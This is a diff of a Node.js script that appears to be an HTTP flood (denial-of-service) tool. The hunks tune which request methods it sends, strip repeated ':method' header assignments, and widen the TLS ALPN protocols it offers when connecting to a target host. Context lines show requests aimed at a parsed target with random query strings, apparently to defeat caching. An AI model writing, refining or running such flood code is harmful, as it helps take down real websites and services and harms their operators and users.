@@ -884,9 +884,6 @@ process.on("unhandledRejection", errorHandler);
   methods = [
   'GET',
   'POST',
-  'HEAD',
-  'DELETE',
-  'PUT',
   ];
 
  version = [
@@ -1076,11 +1073,6 @@ const tips1 =[
 var hd={}
  const Socker = new NetSocket();
  headers[":method"] = "GET";
- headers[":method"] = "POST";
- headers[":method"] = "POST";
- headers[":method"] = "POST";
- headers[":method"] = "GET";
- headers[":method"] = "GET";
  headers[":authority"] = parsedTarget.host;
  headers["x-forwarded-proto"] = "https";
  headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
@@ -1262,7 +1254,7 @@ const rateHeaders4 = [
          const tlsOptions = {
             host: parsedTarget.host,
             secure: true,
-            ALPNProtocols: ["h2"],
+            ALPNProtocols: ["h2","http/1.1","http/2"],
             sigals: "RSA+SHA256:ECDSA+SHA256",
             socket: connection,
             ecdhCurve: "auto",
